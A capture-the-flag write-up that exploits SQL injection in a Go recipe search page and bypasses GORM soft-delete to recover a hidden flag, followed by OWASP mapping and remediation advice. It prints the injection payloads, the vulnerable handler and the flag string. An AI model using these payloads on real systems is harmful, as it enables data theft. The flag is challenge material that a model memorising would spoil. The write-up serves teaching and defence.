
# Hidden Recipe

>> I accidentally deleted my family's secret recipe.. ><
---
This challenge involved exploiting a vulnerable recipe search page to leak the hidden secret in the database that was intended to be deleted.
<br><br>
I needed to exploit 
1. SQL Injection
2. GORM's soft-delete

## Writeup
### Step 1: Initial Site Exploration

The website was a simple one page search with only a search field and button. <br>

### Step 2: Testing for SQL Injection
Since we have access to the source code, I can see here:

```
func searchHandler(w http.ResponseWriter, r *http.Request) { 
	q := r.URL.Query().Get("q") 
	var recipes []Recipe 
	db.Where("title LIKE '%" + q + "%'").Find(&recipes)
	searchTmpl.Execute(w, recipes)
```
Unsanitized input that looks vulnerable to SQL injection. <br>

By testing a simple input of `%’ OR ‘1=1- -` <br>
The entire database of recipes which we can also see in the source code, is leaked: <br>
- Tomato Pasta <br>
    * Boil pasta. Make sauce with tomatoes, garlic, and olive oil. Mix together.<br>
- Chicken Curry <br>
    * Cook chicken with curry powder, coconut milk, and vegetables. Serve with rice.<br>
- Caesar Salad <br>
    * Mix romaine lettuce with croutons, parmesan, and Caesar dressing.<br>
- Grilled Salmon <br>
    * Season salmon with salt and pepper. Grill for 4 minutes each side.<br>
- Miso Soup <br>
    * Dissolve miso paste in dashi broth. Add tofu and wakame seaweed.<br><br> 

Delicious.

---

### Step 3: GORM Soft-Delete Bypass

The GORM documentation explicitly states: 
>>If your model includes a gorm.DeletedAt field (which is included in gorm.Model), it will get soft delete ability automatically!
When calling Delete, the record WON’T be removed from the database, but GORM will set the DeletedAt‘s value to the current time, and the data is not findable with normal Query methods anymore.

In the source code I can see:
```
type Recipe struct {
	gorm.Model 
	Title       string
	Description string
}
```

Which means DeletedAt, and the soft-delete is added.
To hide the soft-deleted rows, GORM auto-appends deleted_at IS NULL to every Find operation, but an attacker can inject into the WHERE clause and recover the deleted row.

```
db.Where("title LIKE '%" + q + "%'").Find(&recipes)
```

To exploit this, I used a payload that closes the parentheses of the generated SQL and append an OR condition to retrieve the deleted row:
GORM generated query:

```
SELECT * FROM recipes WHERE (title LIKE '%input%') AND recipes.deleted_at IS NULL
```

Payload:
`/search?q=’) OR deleted_at IS NOT NULL OR (title LIKE ‘`

Results in:
```
SELECT * FROM recipes
WHERE (title LIKE '%')
	OR deleted_at IS NOT NULL
	OR (title LIKE '%') AND recipes.deleted_at IS NULL
```

Which exposes the entire database including the flag which is in the soft-deleted row.

---
## Flag
---
```
CPCTF{k!MChI_FR!ed_RiC3_w1th_MaY0nnA1s3}
```
---

## Real World Impact & Lessons Learned
- Database Exfiltration:
    * SQL injection can lead to full database exfiltration which can leak sensitive info like PII, usernames, and passwords which can lead to other accounts becoming compromised if passwords have been reused and safeguards like MFA are not put into place.
- Potential Regulatory Fines and Reputational Damage
    * Regulatory fines from data protection standards like PCI-DSS, GDPR, HIPAA, etc can lead to fines and penalties.
SQL injection vulnerabilities are one of the oldest and most understood methods of attack, meaning a company being subjected to this kind of attack can suffer heavy reputational damage. 


## Connecting to OWASP Top 10
- A05 2025: Injection <br>
    * User input directly into SQL without parameters or sanitization <br>
- A01 2025: Broken Access Control <br>
    * Soft-deleted records stay in the database and can be retrieved with SQL injection which bypasses the intended access limits <br> 
- A02 2025: Security Misconfiguration <br>
    * Relying on soft-deletes for secrets and sensitive data without understanding how the storage behavior can still be manipulated and exploited.

## Remediation 

| Vulnerability | Remediation |
|---------------|-------------|
|SQL Injection  |SQL Injection: Parameterized queries via GORM’s ? syntax |
|Soft-Delete Data Exposure |Hard delete sensitive data and secrets after using |
|No Query Logging |Enable GORM’s query logger in all environments |
|No WAF/Input Validation |Deploy WAF with SQLi ruleset; add server-side input validation |

### 1. Use Parameterized Queries
Instead of:
```
db.Where("title LIKE '%" + q + "%'").Find(&recipes)
```

Use:
```
db.Where("title LIKE ?", "%" + q + "%")/Find(&recipes)
```
---

### 2. Hard Delete Sensitive Data
Don't rely on the soft-delete function and use db.Unscoped().Delete() to issue a real DELETE statement if the data must be removed.
Instead of:
```
db.Delete(&secret)
```

Use:
```
db.Unscoped().Delete(&secret)
```
Environment variables, and secrets managers are also more appropriate if sensitive data is only needed temporarily.

---

### 3. Enable Query Logging
Enable GORM's query logger to make generated SQL visible. In dev environments this would have made the soft-delete filter and parentheses wrapper obvious.
```
db, err = gorm.Open(sqlite.Open("recipes.db"), &gorm.Config{
  Logger: logger.Default.LogMode(logger.Info),
})
```

---
### Defense-in-Depth Measures

- Input Validation: Reject or sanitize queries that contain SQL metacharacters.
- Web Application Firewall: A WAF with SQLi rulesets can detect and block many common injection payloads.
- Least Privilege Database Accounts: Only allow SELECT, INSERT, and UPDATE in the application database.
- Static Analysis: Tools like Semgrep can flag string-concatenated SQL queries before they reach production environments.




